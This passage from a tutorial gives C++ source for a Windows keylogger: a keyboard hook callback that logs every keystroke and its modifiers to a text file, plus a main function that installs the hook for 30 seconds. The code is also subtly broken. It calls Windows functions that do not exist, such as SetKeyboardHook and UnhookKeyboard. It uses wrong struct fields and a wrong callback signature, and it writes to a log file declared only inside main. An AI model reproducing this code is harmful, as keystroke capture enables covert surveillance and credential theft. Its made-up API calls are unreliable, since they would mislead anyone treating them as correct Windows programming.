Define a callback function to handle keyboard events:
```cpp
void CALLBACK KeyboardHookProc(int nCode, int wParam, int lParam) {
    if (nCode == 0 || nCode == 1) { // KeyDown or KeyUp
        KBDLLHOOKSTRUCT* llk = (KBDLLHOOKSTRUCT*)lParam;
        int key = llk->vk;
        int state = llk->state;

        if (nCode == 0) { // KeyDown
            std::lock_guard<std::mutex> lock(log_mutex);
            char key_char = static_cast<char>(key);
            log_file << key_char << " (KeyDown) ";
            // Check modifiers
            if (state & 0x00000080) { // Shift is pressed
                log_file << "Shift";
            }
            if (state & 0x00000040) { // Alt is pressed
                log_file << " Alt";
            }
            log_file << "\n";
        } else { // KeyUp
            std::lock_guard<std::mutex> lock(log_mutex);
            log_file << static_cast<char>(key) << " (KeyUp) \n";
        }
    }
}
```

### Step 3: Main Function to Set Up the Hook
Implement the main function to set up the hook and log keystrokes:
```cpp
int main() {
    HWND hwnd = GetDesktopWindow();
    HHOOK hk = 0;

    // Check existing hook and remove if present
    int current_hk = GetKeyboardHookID(hwnd);
    if (current_hk) {
        if (!UnhookKeyboard(hwnd, current_hk)) {
            std::cerr << "Failed to remove existing hook.\n";
            return 1;
        }
    }

    // Set up the keyboard hook
    hk = SetKeyboardHook(hwnd, WH_KEYBOARD_LL, KeyboardHookProc);

    // Open log file
    std::ofstream log_file("keyboard_log.txt", std::ios::app);
    log_file << "Keyboard hook is active.\n";
    log_file.close();

    // Ensure the hook is properly registered
    if (!hk) {
        std::cerr << "Failed to set up keyboard hook.\n";
        return 1;
    }

    // Terminate the program after a few seconds (you may adjust this time as needed)
    std::this_thread::sleep_for(std::chrono::seconds(30));

    // Cleanup
    if (!UnhookKeyboard(hwnd, hk)) {
        std::cerr << "Failed to unregister keyboard hook.\n";
    }

    return 0;
}
```

